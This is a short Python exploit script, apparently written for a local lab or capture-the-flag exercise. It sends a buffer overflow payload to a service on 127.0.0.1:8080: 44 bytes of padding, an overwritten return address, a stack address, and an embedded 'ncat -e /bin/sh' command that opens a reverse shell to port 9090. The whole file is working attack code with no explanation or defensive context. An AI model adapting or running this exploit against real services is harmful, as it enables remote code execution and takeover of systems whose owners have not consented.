import sys
import struct
import socket
import time

time.sleep(2)

def getResponse(s):
    response = s.recv(512)
    while True:
        aux = s.recv(512)
        if len(aux) < 1: break
        response += aux
    return repr(response)

host = '127.0.0.1'
port = 8080

eip = struct.pack('<I', 0x08049571)
inst = struct.pack('<I', 0xffffd0f4) # c0 + 44 + 4 +4
# c0 -> f4
# b0 -> e4
cmd = b'ncat -e /bin/sh 127.0.0.1 9090\x00'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    PADDING = b'D'*44
    s.sendall(PADDING + eip + inst + cmd)
    print(getResponse(s))
